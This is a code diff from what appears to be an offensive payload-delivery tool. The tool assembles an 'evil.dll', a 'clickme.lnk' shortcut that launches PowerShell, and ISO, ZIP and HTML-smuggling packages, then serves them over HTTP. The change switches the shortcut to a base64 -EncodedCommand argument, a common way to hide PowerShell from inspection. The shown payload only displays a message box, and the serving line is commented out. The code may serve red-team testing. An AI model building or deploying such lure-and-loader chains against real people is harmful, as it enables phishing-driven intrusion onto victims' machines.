@@ -3,7 +3,7 @@ import logging
 from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
 from make.lnk.lnk import makeLnk
 from make.iso.iso import makeIso
-from make.powershell.powershell import makePowershell
+from make.powershell.powershell import makePowershellCommand, makePowershellEncodedCommand
 from make.zip.zip import makeZip
 
 from helpers import readFileContent, saveAceFile, makeAceFile
@@ -19,14 +19,14 @@ def main():
     dllFile: AceFile = makeAceFile('evil.dll', dllData)
     
     # LNK to powershell.exe to execute DLL
-    execData: str = makePowershell(
-        input='ls evil.dll',
+    execData: str = makePowershellEncodedCommand(
+        input="Add-Type -AssemblyName PresentationCore,PresentationFramework; $msgBody = 'This is a simple message with just the default OK button'; [System.Windows.MessageBox]::Show($msgBody)",
         options={},
     )
     lnkData: bytes = makeLnk(
         name = "clickme.lnk",
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        arguments = "-noexit -command {}".format(execData),
+        arguments = "-noexit -EncodedCommand {}".format(execData),
     )
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
@@ -47,7 +47,7 @@ def main():
 
     # serve HTML
     serveHtml: AceRoute = AceRoute('/test2', html)
-    serve([serveHtml])
+    #serve([serveHtml])
 
 
 if __name__ == "__main__":
